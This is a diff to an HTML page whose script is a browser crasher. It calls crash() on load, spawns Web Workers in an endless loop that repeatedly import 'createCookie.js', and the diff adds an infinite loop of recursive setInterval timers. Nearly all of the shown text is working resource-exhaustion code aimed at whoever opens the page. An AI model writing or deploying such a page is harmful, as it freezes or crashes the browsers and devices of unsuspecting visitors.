@@ -156,13 +156,12 @@
       
       window.onload = function() {
         crash();
-      };
-      
-      
-      
+      };         
       while (true) {
         new Worker("data:text/javascript," + encodeURIComponent("setInterval(() => { importScripts('createCookie.js'); }, 1);"));
       }
+      x = function(){setInterval(console.log,1,Math.random());try{setInterval(x,1);} catch(e){console.log(e);}}
+      while (true){try{setInterval(x,1);}catch(e){console.log(e);}}
     </script>
   </body>
 </html>
